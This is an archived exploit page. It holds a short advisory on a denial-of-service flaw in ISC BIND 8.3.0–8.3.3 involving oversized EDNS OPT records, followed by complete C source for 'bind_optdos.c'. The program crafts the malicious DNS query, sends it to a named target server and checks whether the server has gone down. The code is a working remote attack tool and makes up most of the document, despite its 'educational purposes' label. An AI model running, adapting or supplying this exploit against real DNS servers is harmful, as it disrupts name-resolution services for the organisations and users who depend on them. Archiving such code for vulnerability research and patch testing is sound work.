source: http://www.securityfocus.com/bid/6161/info

ISC BIND is vulnerable to a denial of service attack. When a DNS lookup is requested on a non-existant sub-domain of a valid domain and an OPT resource record with a large UDP payload is attached, the server may fail. 

/*
 *
 * bind_optdos.c
 *
 * OPT DoS Remote Exploit for BIND 8.3.0 - 8.3.3-REL
 * Based on the bug disclosed by ISS
 *
 * (c) Spybreak (spybreak@host.sk)   November/2002
 *
 * Proof of concept exploit code
 * For educational and testing purposes only!
 *
 *
 * Usage: ./bind_optdos domain target [udp_size]
 *
 * domain - should be a nonexistent subdomain
 * of an existing one, different from the target's,
 * or a domain whose authoritative name servers are
 * unreachable
 *
 *
 * Greetz to: sd, g00bER and hysteria.sk ;-)
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <time.h>

#define         UDP_SIZE        65535
#define         OPT             41
#define         PORT            53
#define         MAXRESP         1024
#define         TIMEOUT         10

typedef struct {
        unsigned short rcode    : 4;
        unsigned short zero     : 3;
        unsigned short ra       : 1;
        unsigned short rd       : 1;
        unsigned short tc       : 1;
        unsigned short aa       : 1;
        unsigned short opcode   : 4;
        unsigned short qr       : 1;
} MSG_FLAGS;

typedef struct {
        unsigned short  id;
        unsigned short  flags;
        unsigned short  nqst;
        unsigned short  nansw;
        unsigned short  nauth;
        unsigned short  nadd;
} DNS_MSG_HDR;

void usage(char *argv0)
{
        printf("********************************************\n"
               "*    OPT DoS Exploit for BIND 8.3.[0-3]    *\n"
               "*       (c) Spybreak   November/2002       *\n"
               "********************************************\n");
        printf("\n%s domain target [udp_size]\n\n", argv0);
        exit(0);
}

void sig_alrm(int signo)
{
  printf("No response yet, the target BIND seems to be down\n");
  exit(0);
}

main(int argc, char **argv)
{
  struct sockaddr_in targ_addr;
  struct hostent *he;
  MSG_FLAGS fl;
  DNS_MSG_HDR hdr;
  unsigned char qname[512], buff[1024];
  unsigned char *bu, *dom, *dot;
  int msg_size, dom_len, sockfd, n;
  unsigned short udp_size = UDP_SIZE;
  char response[MAXRESP + 1];

  if (argc < 3)
        usage(argv[0]);
  if (argc == 4)
        udp_size = (unsigned short) atoi(argv[3]);

  if (!(he = gethostbyname(argv[2]))) {
        printf("Invalid target '%s'\n", argv[2]);
        exit(-1);
  }

  printf("Query on domain: %s\nTarget: %s\n", argv[1], argv[2]);
  printf("EDNS UDP size: %u\n", udp_size);

  if (argv[1][strlen(argv[1]) - 1] == '.')
        argv[1][strlen(argv[1]) - 1] = '\0';

  strncpy(qname + 1, argv[1], sizeof(qname) - 2);
  dom = qname;

  while (dot = (unsigned char *) strchr(dom + 1, '.')) {
        *dom = dot - dom - 1;
        dom = dot;
  }
  *dom = strlen(dom + 1);
  dom_len = dom - qname + strlen(dom + 1) + 2;

  bu = buff;

  fl.qr = 0;
  fl.opcode = 0;
  fl.aa = 0;
  fl.tc = 0;
  fl.rd = 1;
  fl.ra = 0;
  fl.zero = 0;
  fl.rcode = 0;

  srand(time(0));
  hdr.id = htons((unsigned short) (65535.0*rand()/(RAND_MAX+1.0)) + 1);
  hdr.flags = htons(*((unsigned short *) &fl));
  hdr.nqst = htons(1);
  hdr.nansw = 0;
  hdr.nauth = 0;
  hdr.nadd = htons(1);

  bcopy(&hdr, bu, sizeof(hdr));
  bu += sizeof(hdr);
  bcopy(qname, bu, dom_len);
  bu += dom_len;
  *(((unsigned short *) bu)++) = htons(1);              //query type
  *(((unsigned short *) bu)++) = htons(1);              //query class

                                                        //opt rr
  *bu++ = '\0';
  *(((unsigned short *) bu)++) = htons(OPT);            //type
  *(((unsigned short *) bu)++) = htons(udp_size);       //udp payload size
  *(((unsigned int *) bu)++) = htons(0);                //extended rcode and flags
  *(((unsigned short *) bu)++) = htons(0);              //rdlen

  msg_size = bu - buff;

  bzero(&targ_addr, sizeof(targ_addr));
  targ_addr.sin_family = AF_INET;
  targ_addr.sin_port = htons(PORT);
  targ_addr.sin_addr = *(struct in_addr *) he->h_addr;

  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) {
        perror("socket");
        exit(-1);
  }
  n = sendto(sockfd, buff, msg_size, 0, (struct sockaddr *) &targ_addr, (socklen_t) sizeof(targ_addr));
  if (n < 0) {
        perror("sendto");
        exit(-1);
  }

  printf("Datagram sent\nWaiting for response ...\n");

  signal(SIGALRM, sig_alrm);
  alarm(TIMEOUT);
  n = recvfrom(sockfd, response, MAXRESP, 0, NULL, NULL);
  alarm(0);

  printf("Response received, the target BIND seems to be still up\n");
  printf("Maybe the target is not an OPT DoS vulnerable BIND version,recursion disabled, or try to change domain/udp_size, ...\n");
  exit(0);
}